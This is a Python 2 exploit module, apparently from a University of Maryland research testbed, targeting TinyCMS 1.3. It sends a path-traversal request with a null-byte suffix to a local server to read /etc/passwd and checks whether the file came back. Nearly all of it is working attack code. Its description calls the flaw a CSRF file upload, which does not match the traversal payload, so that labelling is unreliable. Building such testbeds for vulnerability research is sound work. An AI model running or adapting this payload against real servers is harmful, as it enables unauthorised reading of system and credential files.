
# Copyright 2013 University of Maryland.  All rights reserved.
# Use of this source code is governed by a BSD-style
# license that can be found in the LICENSE.TXT file.


import sys
import os
import time
import re
import urllib
import httplib


import selenium.common.exceptions
import framework

class Exploit (framework.Exploit):

    attributes = {'Name' :        "OSVDB_82649A",
                  'Description' : "TinyCMS contains a flaw that allows a remote Cross-site Request Forgery " \
                                  "(CSRF / XSRF) attack. The flaw exists because the application does not require " \
                                  "multiple steps or explicit confirmation for sensitive transactions for uploading " \
                                  "files. By using a crafted URL (e.g., a crafted GET request inside an img tag), an " \
                                  "attacker may trick the victim into clicking on the image to take advantage of the " \
                                  "trust relationship between the authenticated victim and the application. Such an " \
                                  "attack could trick the victim into uploading a file in the context of their session " \
                                  "with the application, without further prompting or verification.",
                  'References' :  [['http://osvdb.org/show/osvdb/82649']], 
                  'Target' :      "TinyCMS 1.3",
                  'Type' : 'CSRF',
                  }

    verified = False

    def __init__(self, visible=False):
        framework.Exploit.__init__(self, visible)
        self.verified = False
        return
            

    def exploit(self):


        headers = {"X_REQUESTED_WITH" : "XMLHttpRequest",
                   "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"}
        
        conn = httplib.HTTPConnection("127.0.0.1")
        conn.request("GET",
                     "http://127.0.0.1/tinycms/index.php?page=../../../../../etc/passwd%00",
                     "",
                     headers)
        
        response = conn.getresponse()
     
        data = response.read()
        print data
        conn.close()
        
        
        if re.match(".*\"content\":\"(.+)\".*", data):
            self.logger.info("downloaded /etc/passwd")
            self.verified = True
        else:
            self.logger.info("failed to get /etc/passwd")
            self.verified = False

        return

            
    def verify(self):
        return self.verified
